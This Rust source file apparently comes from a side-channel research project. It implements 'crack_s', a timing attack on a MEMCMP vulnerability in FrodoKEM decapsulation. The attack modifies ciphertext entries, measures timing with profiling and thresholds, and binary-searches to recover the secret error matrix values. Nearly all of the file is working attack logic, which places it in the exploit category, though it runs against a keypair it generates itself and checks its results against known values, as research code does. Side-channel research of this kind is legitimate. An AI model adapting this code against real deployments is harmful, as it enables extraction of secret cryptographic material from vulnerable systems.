use super::modify_and_measure::*;
use crate::attack::memcmp_frodo::MeasureSource;
use crate::utils::save_to_csv;
use crate::utils::Rec;
use crate::utils::Recorder;
use crate::utils::SaveAllRecorder;
use liboqs_rs_bindings as oqs;
use log::{debug, error, info, log, trace, warn, Level};
use log_derive::logfn_inputs;
use oqs::frodokem::FrodoKem;
use oqs::frodokem::KemBuf;
use std::ops::{RangeFrom, RangeTo};
use std::path::PathBuf;

const LOW_PERCENTAGE_LIMIT: f64 = 2.5;
const CONSECUTIVE_LIMIT_CHANGE: u8 = 3;
const MAX_MOD_RETRIES: u8 = 6;
const MAX_BINARYSEARCH_ATTEMPTS: u8 = 3;

#[derive(Debug)]
enum SearchError {
    Internal(String),
    RetryIndex,
    RetryMod,
}

impl<S: ToString> From<S> for SearchError {
    fn from(s: S) -> SearchError {
        SearchError::Internal(s.to_string())
    }
}

#[derive(Debug)]
struct Threshold {
    pub goodhighrange: RangeFrom<f64>,
    pub goodlowrange: RangeTo<f64>,
    pub midpoint: f64,
}

#[derive(Debug, PartialEq)]
enum ModCase {
    TooLowMod,
    TooHighMod,
}

impl Threshold {
    fn distinguish(&self, percentage: f64) -> Result<ModCase, SearchError> {
        match (
            self.goodlowrange.contains(&percentage),
            self.goodhighrange.contains(&percentage),
        ) {
            (false, false) => {
                error!(
                    "percentage {} outside of expected ranges: {:?}",
                    percentage, self
                );
                Err(SearchError::RetryMod)
            }
            (true, false) => Ok(ModCase::TooLowMod),
            (false, true) => Ok(ModCase::TooHighMod),
            _ => Err(SearchError::Internal(
                "percentage value inside both ranges at the same percentage, impossible!"
                    .to_string(),
            )),
        }
    }
}

#[derive(Debug)]
struct SearchState {
    pub maxmod: u16,
    pub index_ij: usize,
    pub maxindex: usize,
    pub highlim: u16,
    pub lowlim: u16,
    pub confirming_bounds: bool,
    pub highlim_confirmed: bool,
    pub lowlim_confirmed: bool,
    pub consecutive_high_changes: u8,
    pub consecutive_low_changes: u8,
    pub lowmodpercentage: Option<f64>,
    pub threshold: Option<Threshold>,
    pub iterations_binsearch: u64,
    pub iterations: u64,
    pub iterations_profiling: u64,
    pub low_moved: bool,
    pub high_moved: bool,
    pub valuelimit: u64,
    pub value_range_1p: Option<RangeTo<u64>>,
}

impl SearchState {
    fn calc_midpoint(&mut self) -> u16 {
        match (self.low_moved, self.high_moved) {
            (true, false) => {
                // the higher boundary has not moved, the probability distribution tells us that
                // the value we are searching for is closer to the low boundary.
                let d = self.highlim - self.lowlim;
                let new = self.lowlim + d / 8;
                debug!(
                    "Skewing the binsearch downwards, {} + ({} - {}) / 8 = {}",
                    self.lowlim, self.highlim, self.lowlim, new
                );
                std::cmp::max(self.lowlim + 1, new)
            }
            (false, true) => {
                // the self.lowerlim boundary has not moved, the probability distribution tells us that
                // the value we are searching for is closer to the self.highlim boundary.
                let d = self.highlim - self.lowlim;
                let new = self.highlim - d / 8;
                debug!(
                    "Skewing the binsearch uwards, {} - ({} - {}) / 8 = {}",
                    self.highlim, self.highlim, self.lowlim, new
                );
                std::cmp::min(self.highlim - 1, new)
            }
            _ => {
                // Both boundaries have now moved, we continue with normal binary search.
                if self.consecutive_low_changes >= CONSECUTIVE_LIMIT_CHANGE {
                    warn!("Upperbound ({}) has not changed for a while, it might be erronous, let's check it again", self.highlim);
                    self.consecutive_low_changes = 0;
                    self.consecutive_high_changes = 0;
                    self.highlim
                } else if self.consecutive_high_changes >= CONSECUTIVE_LIMIT_CHANGE {
                    warn!("Lowerbound ({}) has not changed for a while, it might be erronous, let's check it again", self.lowlim);
                    self.consecutive_low_changes = 0;
                    self.consecutive_high_changes = 0;
                    self.lowlim
                } else if self.confirming_bounds {
                    // We are currently trying to confirm our found value
                    if !self.highlim_confirmed {
                        info!(
                            "Trying to confirm the upperbound of our candidate value: {}",
                            self.lowlim
                        );
                        self.highlim
                    } else {
                        info!(
                            "Trying to confirm the lowerbound of our candidate value: {}",
                            self.lowlim
                        );
                        self.lowlim
                    }
                } else {
                    (self.highlim + self.lowlim) / 2
                }
            }
        }
    }

    fn update_state(
        &mut self,
        percentage: f64,
        currentmod: u16,
    ) -> Result<Option<u16>, SearchError> {
        if let Some(threshold) = &self.threshold {
            // Compare results to threshold
            match threshold.distinguish(percentage)? {
                ModCase::TooLowMod => {
                    self.consecutive_low_changes += 1;
                    self.consecutive_high_changes = 0;
                    if currentmod == self.lowlim {
                        self.lowlim_confirmed = true;
                        info!(
                            "C[{}/{}] => Confirmed lowerbound {}!",
                            self.index_ij, self.maxindex, currentmod
                        );
                    } else if currentmod == self.highlim {
                        error!(
                            "C[{}/{}] => Conflicting results for upperbound {}!",
                            self.index_ij, self.maxindex, currentmod
                        );
                        return Err(SearchError::RetryIndex);
                    } else {
                        info!(
                            "C[{}/{}] => +Raising lowerbound to {}",
                            self.index_ij, self.maxindex, currentmod
                        );
                        self.lowlim = currentmod;
                        self.low_moved = true;
                    }
                }
                ModCase::TooHighMod => {
                    self.consecutive_low_changes = 0;
                    self.consecutive_high_changes += 1;
                    if currentmod == self.highlim {
                        self.highlim_confirmed = true;
                        info!(
                            "C[{}/{}] => Confirmed upperbound {}!",
                            self.index_ij, self.maxindex, currentmod
                        );
                    } else if currentmod == self.lowlim {
                        error!(
                            "C[{}/{}] => Conflicting results for lowerbound {}!",
                            self.index_ij, self.maxindex, currentmod
                        );
                        return Err(SearchError::RetryIndex);
                    } else {
                        info!(
                            "C[{}/{}] => -Lowering upperbound to {}",
                            self.index_ij, self.maxindex, currentmod
                        );
                        self.highlim = currentmod;
                        self.high_moved = true;
                    }
                }
            }
        } else if let Some(threshold_lowpercentage) = self.lowmodpercentage {
            // Threshold not yet calculated, do it!
            info!(
                "C[{}/{}] => Percentage of values below limit for low amount of modifications: {}",
                self.index_ij, self.maxindex, percentage
            );
            if percentage <= LOW_PERCENTAGE_LIMIT {
                error!(
                    "threshold high ({}) <=  LOW_PERCENTAGE_LIMIT ({})",
                    percentage, LOW_PERCENTAGE_LIMIT
                );
                return Err(SearchError::RetryIndex);
            }

            let diff = percentage - threshold_lowpercentage;
            let halfdiff = diff / 2.0;
            let threshold = Threshold {
                midpoint: threshold_lowpercentage + halfdiff,
                goodlowrange: ..(threshold_lowpercentage + (halfdiff / 2.0)),
                goodhighrange: (percentage - (halfdiff / 2.0))..,
            };
            info!("New threshold is: {:?} (diff: {})", threshold, diff);
            self.threshold.replace(threshold);
            self.highlim = self.maxmod;
            self.lowlim = 0;
            self.iterations = self.iterations_binsearch;
        } else {
            // Record current datapoint, we need it later (see above) to calculate the thresold
            info!(
                "C[{}/{}] => Percentage of values below limit for high amount of modifications: {}",
                self.index_ij, self.maxindex, percentage
            );
            self.lowmodpercentage.replace(percentage);
            self.highlim = self.maxmod + 2; // This ensures that we try maxmod-1 as the second profiling step
            self.lowlim = self.maxmod - 3; // This ensures that we try maxmod-1 as the second profiling step
        }
        if self.highlim - self.lowlim == 1 {
            if self.highlim == self.maxmod {
                error!("Upper bound never changed, we might have missed the real threshold modification!");
                return Err(SearchError::RetryIndex);
            }
            if self.lowlim == 0 {
                error!("Lower bound never changed, we might have missed the real threshold modification!");
                return Err(SearchError::RetryIndex);
            }
            // Only if the limits have been confirmed do we report our success
            if self.lowlim_confirmed && self.highlim_confirmed {
                return Ok(Some(self.highlim));
            } else {
                self.confirming_bounds = true;
            }
        } else {
            self.highlim_confirmed = false;
            self.lowlim_confirmed = false;
        }

        Ok(None)
    }

    fn get_percentage(&mut self, recorder: &Recorder<SaveAllRecorder>) -> Result<f64, SearchError> {
        let limit_1p = recorder
            .nth_lowest_value(recorder.len() / 100)
            .ok_or_else(|| {
                warn!("Not enough recorded values to check the 1% limit");
                SearchError::RetryMod
            })?; //Not enugh recorded values
        if self.threshold.is_none() && self.lowmodpercentage.is_none() {
            // We are in the first part of the profiling phase
            self.valuelimit = limit_1p;
            info!("using {} as the valuelimit below which we calculate the percentage of the number of measurments.", self.valuelimit);
        } else if let Some(range) = &self.value_range_1p {
            // Do a sanity check so that the 1% limit is not too far away
            if !range.contains(&limit_1p) {
                error!("Sanity check failed: {} not in range {:?}", limit_1p, range);
                return Err(SearchError::RetryMod);
            }
        } else {
            // We are in the second part of the profiling phase
            let diff = self.valuelimit - limit_1p;
            let high = self.valuelimit + diff;
            self.value_range_1p = Some(..high); // We don't have a lower limit since we, havn't had any problems with those values
            info!(
                "using {:?} as the range we use as the 1%-based sanity checks for all measurments.",
                self.value_range_1p
            );
        }
        Ok(recorder.percentage_lte(self.valuelimit))
    }
}

#[logfn_inputs(Trace)]
fn search_modification<FRODO: FrodoKem>(
    ciphertext_index: usize,
    index_ij: usize,
    iterations: u64,
    profileiters: u64,
    measure_source: &MeasureSource,
    cutoff: u64,
    ciphertext: &mut FRODO::Ciphertext,
    shared_secret_d: &mut FRODO::SharedSecret,
    secret_key: &mut FRODO::SecretKey,
    expected_x0: u16,
    save_to_file: Option<&PathBuf>,
    recorders: &mut Vec<Recorder<SaveAllRecorder>>,
) -> Result<u16, SearchError> {
    let maxmod = error_correction_limit::<FRODO>() * 2;
    let mut state = SearchState {
        maxmod,
        index_ij,
        maxindex: FRODO::C::len() - 1,
        highlim: 2, // This ensures that we try 1 first
        lowlim: 0,  // This ensures that we try 1 first
        confirming_bounds: false,
        lowlim_confirmed: false,
        highlim_confirmed: false,
        consecutive_high_changes: 0,
        consecutive_low_changes: 0,
        lowmodpercentage: None,
        threshold: None,
        iterations: profileiters,
        iterations_binsearch: iterations,
        iterations_profiling: profileiters,
        low_moved: false,
        high_moved: false,
        valuelimit: 0,
        value_range_1p: None,
    };
    let mut retries = 0;
    let found = loop {
        // Select midpoint to test
        let currentmod: u16 = state.calc_midpoint();
        trace!("high: {}, low: {}", state.highlim, state.lowlim);

        // Measure
        debug!(
            "C[{}/{}] => Testing adding {} to C[{}] with {} iterations.",
            index_ij,
            FRODO::C::len() - 1,
            currentmod,
            index_ij,
            state.iterations
        );

        let rec = if retries > 0 {
            // If we are currently retrying we reuse the previous recorder so that we
            // may aggregate the results and get a better value
            recorders.pop().unwrap()
        } else {
            Recorder::saveall(
                format!(
                    "{}-BINSEARCH[{}]({}){{{}}}",
                    ciphertext_index, index_ij, expected_x0, currentmod
                ),
                Some(cutoff),
            )
        };

        let rec = mod_measure::<FRODO, _>(
            currentmod,
            index_ij,
            state.iterations,
            &measure_source,
            ciphertext,
            shared_secret_d,
            secret_key,
            rec,
        )?;

        // Compute a single representative datapoint
        let percentage = {
            let res = state.get_percentage(&rec);

            // Save measurments to file?
            recorders.push(rec);
            if let Some(path) = save_to_file {
                debug!("Saving measurments to file {:?}", path);
                save_to_csv(&path, &recorders)?;
            }

            res?
        };
        debug!("percentage measurment is {}", percentage);

        // Threshold handling
        match state.update_state(percentage, currentmod) {
            Ok(Some(value)) => {
                break value;
            }
            Ok(None) => {
                retries = 0;
            }
            Err(SearchError::RetryMod) => {
                retries += 1;
                if retries >= MAX_MOD_RETRIES {
                    // We got too many bad results, we need to search with a new profile instead
                    error!("Too many retries for this modification!");
                    return Err(SearchError::RetryIndex);
                } else if retries == MAX_MOD_RETRIES / 2 {
                    // If we have tried half the amount of maximum retries
                    // we discard the previous (uncertain) results and try
                    // again with a new batch
                    warn!("Discarding data for this modification, trying again!");
                    recorders.push(Recorder::saveall(
                        format!(
                            "{}-BINSEARCH[{}]({}){{{}}}",
                            ciphertext_index, index_ij, expected_x0, currentmod
                        ),
                        Some(cutoff),
                    ))
                } else {
                    warn!("Adding more measurments of the same modification!");
                }
            }
            Err(err) => return Err(err),
        }
    };

    Ok(found)
}

//#[logfn_inputs(Trace)]
pub fn crack_s<FRODO: FrodoKem>(
    warmup: u64,
    iterations: u64,
    profileiters: u64,
    measure_source: MeasureSource,
    save_to_file: Option<PathBuf>,
) -> Result<(), String> {
    #![allow(non_snake_case)]
    info!(
        "Launching the crack_s routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );

    let mut public_key = FRODO::PublicKey::new();
    let mut secret_key = FRODO::SecretKey::new();
    let mut ciphertext = FRODO::Ciphertext::new();

    info!("Generating keypair");
    FRODO::keypair(&mut public_key, &mut secret_key)?;

    let mut shared_secret_e = FRODO::SharedSecret::new();
    let mut shared_secret_d = FRODO::SharedSecret::new();

    //let n = FRODO::params().PARAM_N;
    let nbar: usize = FRODO::params().PARAM_NBAR;
    let mbar = nbar;
    let err_corr_limit = error_correction_limit::<FRODO>();
    let nbr_encaps = 100;
    let i = mbar - 1;

    let mut recorders = vec![];

    measure_source.prep_thread()?;

    let mut indexes = 0.0;
    let mut succeses = 0.0;
    let mut skipped = 0.0;

    for t in 0..nbr_encaps {
        info!("Using encaps to generate ciphertext number: {}", t);
        FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;
        let expectedEppp = FRODO::calculate_Eppp(&mut ciphertext, &mut secret_key)?;
        let expectedEppp = expectedEppp.as_slice();

        for j in 0..nbar {
            // Modify ciphertext at C[nbar-1, j]
            let index = i * nbar + j;
            let expected_x0 = (err_corr_limit - expectedEppp[index]) as u16;
            let mut attempt = 0;

            let x0 = loop {
                attempt += 1;
                info!(
                    "Starting {} warmup iterations without modifications in order to detect a good cutoff value", warmup
                );
                let cutoff = {
                    let rec = mod_measure::<FRODO, _>(
                        0,
                        index,
                        warmup,
                        &measure_source,
                        &mut ciphertext,
                        &mut shared_secret_d,
                        &mut secret_key,
                        Recorder::saveall(format!("{}-WARMUP[{}]", t, index), None),
                    )?;
                    let mean = rec.aggregated_value()?;
                    let minimum_value = rec.min()?;
                    let cutoff = mean + (mean - minimum_value);
                    info!(
                        "using {} as the cutoff value to remove outliers (minimum warmup latency: {}, mean: {}).",
                        cutoff, minimum_value, mean
                    );
                    cutoff
                };

                info!(
                    "Starting binary search {}/{} for Eppp[{},{}], expect to find x0 = {}",
                    attempt, MAX_BINARYSEARCH_ATTEMPTS, i, j, expected_x0
                );
                match search_modification::<FRODO>(
                    t,
                    index,
                    iterations,
                    profileiters,
                    &measure_source,
                    cutoff,
                    &mut ciphertext,
                    &mut shared_secret_d,
                    &mut secret_key,
                    expected_x0,
                    save_to_file.as_ref(),
                    &mut recorders,
                ) {
                    Ok(x0) => break Some(x0),
                    Err(SearchError::Internal(err)) => return Err(err),
                    Err(_) => {
                        if attempt >= MAX_BINARYSEARCH_ATTEMPTS {
                            break None;
                        }
                        //RetryIndex and RetryMod
                        warn!("Retrying the search since we didn't get any results.");
                    }
                }
            };

            indexes += 1.0;
            if let Some(x0) = x0 {
                let Eppp_ij = err_corr_limit - x0;
                let lglvl = if Eppp_ij != expectedEppp[index] {
                    Level::Warn
                } else {
                    succeses += 1.0;
                    Level::Info
                };
                log!(
                    lglvl,
                    "Found -Eppp[{},{}]={}-{}={} expected: {}. Current success rate is: {:.0}/{:.0}={}",
                    i,
                    j,
                    err_corr_limit,
                    x0,
                    Eppp_ij,
                    expectedEppp[index],
                    succeses,
                    indexes,
                    (succeses / indexes) * 100.0
                );
            } else {
                skipped += 1.0;
                error!("Max number of attempts ({}) reached! Current success rate is: {:.0}/{:.0}={} ({:.0} skipped)", 
                    attempt,
                    succeses,
                    indexes,
                    (succeses / indexes) * 100.0,
                    skipped
                );
            }
        }
    }

    Ok(())
}
